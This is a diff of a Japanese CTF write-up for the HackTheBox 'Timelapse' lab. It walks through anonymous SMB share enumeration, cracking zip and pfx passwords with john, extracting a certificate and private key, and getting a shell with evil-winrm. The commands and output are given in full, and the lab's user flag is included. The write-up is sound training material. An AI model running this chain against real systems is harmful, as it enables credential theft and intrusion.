@@ -23,9 +23,10 @@ Open 10.129.227.113:49693
 10.129.227.113 -> [53,88,135,139,389,445,464,3268,3269,5986,9389,49667,49673,49674,49693]
 ```
 
+
 ## STEP 2
 匿名で共有フォルダ列挙  
-(netexecやsmbmapでは列挙できなかった、きちんんと`-N`を指定しないといけないツールでないといけない感じ？)
+(netexecやsmbmapでは列挙できなかった、きちんんと`-N`を指定しないといけないツールでないと列挙できない感じ？)
 ```sh
 └─$ smbclient -L '10.129.227.113' -N                        
 
@@ -41,7 +42,7 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.129.227.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 ```
-sharesにアクセス、zipファイルを確認・ダウンロード
+sharesにアクセス、zipファイルをダウンロード
 ```sh
 └─$ smbclient -N //10.129.227.113/shares
 Try "help" to get a list of possible commands.
@@ -77,9 +78,61 @@ supremelegacy    (Dev\winrm_backup.zip/legacyy_dev_auth.pfx)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+zip解凍、pfxファイルを入手  
+pfxからpemファイルに変換を試みたがここでもパスワードあり
 ```sh
 └─$ unzip Dev\\winrm_backup.zip
 Archive:  Dev\winrm_backup.zip
 [Dev\winrm_backup.zip] legacyy_dev_auth.pfx password: 
   inflating: legacyy_dev_auth.pfx
 
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem
+Enter Import Password:
+```
+クラック成功
+```sh
+└─$ pfx2john legacyy_dev_auth.pfx > pfx.txt
+
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=pfx pfx.txt
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:01:26 DONE (2025-09-28 08:36) 0.01155g/s 37333p/s 37333c/s 37333C/s thuglife06..thug211
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+pfxから公開鍵と秘密鍵の証明書を入手
+```sh
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem
+Enter Import Password:
+
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes   
+Enter Import Password:
+
+└─$ ls -l publicCert.pem priv-key.pem
+-rw------- 1 kali kali 1952 Sep 28 08:42 priv-key.pem
+-rw------- 1 kali kali 1232 Sep 28 08:41 publicCert.pem
+```
+winrmでログイン成功！  
+ユーザフラグゲット
+```sh
+└─$ evil-winrm -S -c publicCert.pem -k priv-key.pem -r timelapse.htb -i 10.129.227.113
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> cat ../Desktop/user.txt
+4e9c380f75f6cc9170a322e038205ec7
+```
